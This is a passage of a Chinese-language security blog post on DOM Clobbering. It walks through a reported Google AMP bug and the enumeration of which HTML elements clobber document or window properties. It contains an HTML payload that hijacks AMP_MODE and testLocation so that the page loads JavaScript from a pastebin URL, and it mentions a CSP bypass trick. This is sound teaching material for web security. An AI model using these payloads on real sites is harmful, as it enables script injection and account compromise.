src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-8.png" alt></p><p>&#x63A5;&#x7740;&#x627E;&#x5230;&#x4E0B;&#x4E00;&#x4E2A;<code>AMP_MODE</code>&#xFF0C;&#x8FD9;&#x4E2A;&#x6CA1;&#x6709;&#x88AB; ban &#xFF0C;&#x53CD;&#x800C;&#x8BA9;&#x4F5C;&#x8005;&#x53D1;&#x73B0;&#x4E86;&#x8FD9;&#x91CC;&#x52A0;&#x8F7D;&#x5931;&#x8D25;&#x7684; URL &#x5F53;&#x4E2D;&#x6709;&#x4E00;&#x4E2A;<code>undefined</code></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-9.png" alt></p><p>&#x8FD9;&#x5C31;&#x662F;&#x4F5C;&#x8005;&#x63D2;&#x5165;&#x4E86;<code>&lt;a id=AMP_MODE&gt;</code>&#x5BFC;&#x81F4;&#x4EA7;&#x751F;&#x7684;<code>undefined</code>&#xFF0C;&#x4E3B;&#x8981;&#x4EA7;&#x751F;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x7684;&#x4EE3;&#x7801;&#x7ECF;&#x4F5C;&#x8005;&#x7B80;&#x5316;&#x540E;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> script = <span class="hljs-built_in">window</span>.document.createElement(<span class="hljs-string">&quot;script&quot;</span>);</span><br><span class="line">script.async = <span class="hljs-literal">false</span>;</span><br><span class="line"> </span><br><span class="line"><span class="hljs-keyword">var</span> loc;</span><br><span class="line"><span class="hljs-keyword">if</span> (AMP_MODE.test &amp;&amp; <span class="hljs-built_in">window</span>.testLocation) {</span><br><span class="line">    loc = <span class="hljs-built_in">window</span>.testLocation</span><br><span class="line">} <span class="hljs-keyword">else</span> {</span><br><span class="line">    loc = <span class="hljs-built_in">window</span>.location;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="hljs-keyword">if</span> (AMP_MODE.localDev) {</span><br><span class="line">    loc = loc.protocol + <span class="hljs-string">&quot;//&quot;</span> + loc.host + <span class="hljs-string">&quot;/dist&quot;</span></span><br><span class="line">} <span class="hljs-keyword">else</span> {</span><br><span class="line">    loc = <span class="hljs-string">&quot;https://cdn.ampproject.org&quot;</span>;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="hljs-keyword">var</span> singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + <span class="hljs-string">&quot;/&quot;</span> : <span class="hljs-string">&quot;&quot;</span>;</span><br><span class="line">b.src = loc + <span class="hljs-string">&quot;/rtv/&quot;</span> + AMP_MODE.rtvVersion; + <span class="hljs-string">&quot;/&quot;</span> + singlePass + <span class="hljs-string">&quot;v0/&quot;</span> + pluginName + <span class="hljs-string">&quot;.js&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="hljs-built_in">document</span>.head.appendChild(b);</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4EE3;&#x7801;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x5982;&#x679C;&#x518D;&#x8981;&#x7B80;&#x5316;&#x5230;&#x6838;&#x5FC3;&#x4EE3;&#x7801;&#x5C31;&#x662F;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> script = <span class="hljs-built_in">window</span>.document.createElement(<span class="hljs-string">&quot;script&quot;</span>);</span><br><span class="line">script.async = <span class="hljs-literal">false</span>;</span><br><span class="line"> </span><br><span class="line">b.src = <span class="hljs-built_in">window</span>.testLocation.protocol + <span class="hljs-string">&quot;//&quot;</span> +</span><br><span class="line">        <span class="hljs-built_in">window</span>.testLocation.host + <span class="hljs-string">&quot;/dist/rtv/&quot;</span> +</span><br><span class="line">        AMP_MODE.rtvVersion; + <span class="hljs-string">&quot;/&quot;</span> +</span><br><span class="line">        (AMP_MODE.singlePassType ? AMP_MODE.singlePassType + <span class="hljs-string">&quot;/&quot;</span> : <span class="hljs-string">&quot;&quot;</span>) +</span><br><span class="line">        <span class="hljs-string">&quot;v0/&quot;</span> + pluginName + <span class="hljs-string">&quot;.js&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="hljs-built_in">document</span>.head.appendChild(b);</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7528; Dom Clobbering &#x6765;&#x8BA9;&#x5B83;&#x52A0;&#x8F7D;&#x6211;&#x4EEC;&#x4EFB;&#x610F;&#x7684; js &#x6587;&#x4EF6;&#xFF0C;&#x76F4;&#x63A5;&#x52AB;&#x6301;<code>protocol</code>&#x5230;&#x6211;&#x4EEC;&#x4EFB;&#x610F; URL&#xFF0C;&#x518D;&#x5229;&#x7528;<code>#</code>&#x6CE8;&#x91CA;&#x6389;&#x540E;&#x9762;&#x7684;&#x5373;&#x53EF;&#x3002;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- We need to make AMP_MODE.localDev and AMP_MODE.test truthy--&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;AMP_MODE&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;AMP_MODE&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;localDev&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;AMP_MODE&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;test&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="hljs-comment">&lt;!-- window.testLocation.protocol is a base for the URL --&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;testLocation&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;testLocation&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;protocol&quot;</span></span></span><br><span class="line"><span class="hljs-tag">   <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://pastebin.com/raw/0tn8z0rG#&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x867D;&#x7136; URL &#x6784;&#x9020;&#x51FA;&#x6765;&#x4E86;&#xFF0C;&#x4F46;&#x662F; Google &#x8FD8;&#x6709; CSP</p><p></p><figure class="highlight gams hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src <span class="hljs-string">&apos;none&apos;</span>;</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">script</span></span>-src <span class="hljs-string">&apos;sha512-oQwIl...==&apos;</span></span><br><span class="line">  https:<span class="hljs-comment">//cdn.ampproject.org/rtv/</span></span><br><span class="line">  https:<span class="hljs-comment">//cdn.ampproject.org/v0.js</span></span><br><span class="line">  https:<span class="hljs-comment">//cdn.ampproject.org/v0/</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x867D;&#x7136;&#x4ED6;&#x5F53;&#x65F6;&#x6CA1;&#x7ED5;&#x8FC7;&#xFF0C;&#x4F46;&#x662F; Google &#x8FD8;&#x662F;&#x5168;&#x989D;&#x5730;&#x7ED9;&#x4E86;&#x4ED6;&#x5956;&#x91D1;&#x3002;</p><p>&#x53E6;&#x5916;&#x8FD9;&#x4E2A; CSP &#x53EF;&#x4EE5;&#x5229;&#x7528;<code>..%252f</code>&#x7684; trick &#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#xFF0C;&#x7531;&#x4E8E;&#x4E0D;&#x5C5E;&#x4E8E;&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;&#x7684;&#x8303;&#x56F4;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x8BE6;&#x8FF0;&#x4E86;&#xFF0C;&#x611F;&#x5174;&#x8DA3;&#x7684;&#x540C;&#x5B66;&#x53EF;&#x81EA;&#x884C;&#x641C;&#x7D22;&#x3002;</p><p>&#x8FD9;&#x91CC;&#x7531;&#x4E8E;&#x7BC7;&#x5E45;&#x5173;&#x7CFB;&#xFF0C;&#x5C31;&#x4E0D;&#x518D;&#x5217;&#x4E3E;&#x66F4;&#x591A;&#x7684;&#x4F8B;&#x5B50;&#x4E86;&#xFF0C;&#x6211;&#x4F1A;&#x628A;&#x6700;&#x8FD1;&#x81EA;&#x5DF1;&#x505A;&#x7684;&#x4E00;&#x4E9B; XSS Game &#x4E2D;&#x6D89;&#x53CA;&#x5230; Dom Clobbering &#x7684;&#x90E8;&#x5206;&#x4EE5; Tip &#x7684;&#x5F62;&#x5F0F;&#x5199;&#x51FA;&#x6765;&#x3002;</p><h2 id="Thinking"><a href="#Thinking" class="headerlink" title="Thinking"></a>Thinking</h2><p>&#x65E2;&#x7136;&#x6211;&#x4EEC;&#x4E00;&#x5F00;&#x59CB;&#x63D0;&#x5230;&#x8FC7;&#x6216;&#x8BB8;&#x53EF;&#x4EE5;&#x8986;&#x76D6;&#x67D0;&#x4E9B;&#x5C5E;&#x6027;&#xFF0C;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x53EF;&#x4E0D;&#x53EF;&#x4EE5;&#x8986;&#x76D6;&#x6216;&#x8005;&#x8BF4;&#x5B8C;&#x5168;&#x63A7;&#x5236;<code>document.cookie</code>&#x5462;&#xFF1F;&#x7A76;&#x7ADF;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8986;&#x76D6;&#x54EA;&#x4E9B;&#x5462;&#xFF1F;&#x53C8;&#x53EF;&#x4EE5;&#x600E;&#x4E48;&#x5229;&#x7528;&#x5462;&#xFF1F;&#x54EA;&#x4E9B;&#x53EF;&#x4EE5;&#x7528; ID &#x54EA;&#x4E9B;&#x7528; Name&#x5462;&#xFF1F;</p><p>&#x63A5;&#x4E0B;&#x6765;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#xFF1A;&#x54EA;&#x4E9B;&#x7528; id &#x54EA;&#x4E9B;&#x7528; name &#xFF1F;</p><h3 id="Document-amp-Id"><a href="#Document-amp-Id" class="headerlink" title="Document &amp; Id"></a>Document &amp; Id</h3><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> html = [...];<span class="hljs-comment">//HTML elements array</span></span><br><span class="line"><span class="hljs-keyword">var</span> log = [];</span><br><span class="line"><span class="hljs-keyword">var</span> div = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;div&quot;</span>);</span><br><span class="line"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; html.length; i++) {</span><br><span class="line">  div.innerHTML = <span class="hljs-string">&quot;&lt;&quot;</span> + html[i] + <span class="hljs-string">&quot; id=x &gt;&quot;</span>;</span><br><span class="line">  <span class="hljs-built_in">document</span>.body.appendChild(div);</span><br><span class="line">  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">document</span>.x == <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&apos;x&apos;</span>) &amp;&amp; <span class="hljs-built_in">document</span>.x != <span class="hljs-literal">undefined</span>) {</span><br><span class="line">    log.push(html[i]);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">document</span>.body.removeChild(div);</span><br><span class="line">}</span><br><span class="line"><span class="hljs-built_in">console</span>.log(log);</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x53EA;&#x6709;<code>object</code>&#x6807;&#x7B7E;<code>document</code>&#x53EF;&#x4EE5;&#x901A;&#x8FC7; id &#x8FDB;&#x884C;&#x76F4;&#x63A5;&#x83B7;&#x53D6;</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="hljs-string">&quot;object&quot;</span>]</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Document-amp-Name"><a href="#Document-amp-Name" class="headerlink" title="Document &amp; Name"></a>Document &amp; Name</h3><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">document</span>.x == <span class="hljs-built_in">document</span>.getElementsByName(<span class="hljs-string">&quot;x&quot;</span>)[<span class="hljs-number">0</span>] &amp;&amp; <span class="hljs-built_in">document</span>.x != <span class="hljs-literal">undefined</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x4EE5;&#x4E0B;&#x4E94;&#x4E2A;&#x5143;&#x7D20;&#x53EF;&#x4EE5;&#x8BA9;<code>document</code>&#x901A;&#x8FC7; name &#x8FDB;&#x884C;&#x76F4;&#x63A5;&#x83B7;&#x53D6;</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#xA0;[<span class="hljs-string">&quot;embed&quot;</span>, <span class="hljs-string">&quot;form&quot;</span>, <span class="hljs-string">&quot;image&quot;</span>, <span class="hljs-string">&quot;img&quot;</span>, <span class="hljs-string">&quot;object&quot;</span>]</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Document-amp-Name-amp-Id"><a href="#Document-amp-Name-amp-Id" class="headerlink" title="Document &amp; Name &amp; Id"></a>Document &amp; Name &amp; Id</h3><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> html = [...];<span class="hljs-comment">//HTML elements array</span></span><br><span class="line"><span class="hljs-keyword">var</span> log = [];</span><br><span class="line"><span class="hljs-keyword">var</span> div = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;div&quot;</span>);</span><br><span class="line"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; html.length; i++) {</span><br><span class="line">  div.innerHTML = <span class="hljs-string">&quot;&lt;&quot;</span> + html[i] + <span class="hljs-string">&quot; id=x name=y &gt;&quot;</span>;</span><br><span class="line">  <span class="hljs-built_in">document</span>.body.appendChild(div);</span><br><span class="line">  <span class="hljs-keyword">if</span> (</span><br><span class="line">    <span class="hljs-built_in">document</span>.x == <span class="hljs-built_in">document</span>.getElementsByName(<span class="hljs-string">&quot;y&quot;</span>)[<span class="hljs-number">0</span>] &amp;&amp; <span class="hljs-built_in">document</span>.x != <span class="hljs-literal">undefined</span></span><br><span class="line">  ) {</span><br><span class="line">    log.push(html[i]);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">document</span>.body.removeChild(div);</span><br><span class="line">}</span><br><span class="line"><span class="hljs-built_in">console</span>.log(log);</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x4E00;&#x4E0B;&#x4E09;&#x4E2A;&#x5143;&#x7D20;&#xFF1A;</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="hljs-string">&quot;image&quot;</span>, <span class="hljs-string">&quot;img&quot;</span>, <span class="hljs-string">&quot;object&quot;</span>]</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Window-amp-Id"><a href="#Window-amp-Id" class="headerlink" title="Window &amp; Id"></a>Window &amp; Id</h3><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> html = [...];<span class="hljs-comment">//HTML elements array</span></span><br><span class="line"><span class="hljs-keyword">var</span> log = [];</span><br><span class="line"><span class="hljs-keyword">var</span> div = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;div&quot;</span>);</span><br><span class="line"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; html.length; i++) {</span><br><span class="line">  div.innerHTML = <span class="hljs-string">&quot;&lt;&quot;</span> + html[i] + <span class="hljs-string">&quot; id=x &gt;&quot;</span>;</span><br><span class="line">  <span class="hljs-built_in">document</span>.body.appendChild(div);</span><br><span class="line">  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">window</span>.x == <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&apos;x&apos;</span>) &amp;&amp; <span class="hljs-built_in">window</span>.x != <span class="hljs-literal">undefined</span>) {</span><br><span class="line">    log.push(html[i]);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">document</span>.body.removeChild(div);</span><br><span class="line">}</span><br><span class="line"><span class="hljs-built_in">console</span>.log(log);</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x9664;&#x4E86;&#x5728; [Not Clobbered](#Not Clobbered) &#x90E8;&#x5206;&#x7684;&#x6807;&#x7B7E;&#xFF0C;&#x5176;&#x4ED6;&#x6807;&#x7B7E;<code>window</code>&#x5747;&#x53EF;&#x901A;&#x8FC7; id &#x8FDB;&#x884C;&#x76F4;&#x63A5;&#x83B7;&#x53D6;</p><p></p><figure class="highlight scheme hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="hljs-name">128</span>) [<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;abbr&quot;</span>, <span class="hljs-string">&quot;acronym&quot;</span>, <span class="hljs-string">&quot;address&quot;</span>, <span class="hljs-string">&quot;applet&quot;</span>, <span class="hljs-string">&quot;area&quot;</span>, <span class="hljs-string">&quot;article&quot;</span>, <span class="hljs-string">&quot;aside&quot;</span>, <span class="hljs-string">&quot;audio&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;base&quot;</span>, <span class="hljs-string">&quot;basefont&quot;</span>, <span class="hljs-string">&quot;bdi&quot;</span>, <span class="hljs-string">&quot;bdo&quot;</span>, <span class="hljs-string">&quot;bgsound&quot;</span>, <span class="hljs-string">&quot;big&quot;</span>, <span class="hljs-string">&quot;blink&quot;</span>, <span class="hljs-string">&quot;blockquote&quot;</span>, <span class="hljs-string">&quot;br&quot;</span>, <span class="hljs-string">&quot;button&quot;</span>, <span class="hljs-string">&quot;canvas&quot;</span>, <span class="hljs-string">&quot;center&quot;</span>, <span class="hljs-string">&quot;cite&quot;</span>, <span class="hljs-string">&quot;code&quot;</span>, <span class="hljs-string">&quot;command&quot;</span>, <span class="hljs-string">&quot;content&quot;</span>, <span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;datalist&quot;</span>, <span class="hljs-string">&quot;dd&quot;</span>, <span class="hljs-string">&quot;del&quot;</span>, <span 